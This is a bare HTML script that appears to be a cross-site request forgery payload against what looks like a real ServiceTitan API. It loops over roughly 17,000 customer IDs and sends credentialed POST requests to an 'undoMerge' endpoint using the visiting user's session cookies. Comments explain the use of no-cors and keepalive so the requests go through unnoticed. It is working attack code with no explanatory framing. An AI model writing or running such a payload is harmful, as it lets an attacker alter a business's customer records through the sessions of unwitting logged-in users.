<script>
  const start = 1393000, end = 1409999;

  (async () => {
    for (let id = start; id <= end; id++) {
      fetch(`https://integration.servicetitan.com/app/api/customers/${id}/undoMerge`, {
        method: "POST",
        mode: "no-cors",          // opaque response, which is fine
        credentials: "include",   // send session cookies
        keepalive: true           // helps if the tab gets closed
      });
      await new Promise(r => setTimeout(r, 1200));
    }
  })();
</script>
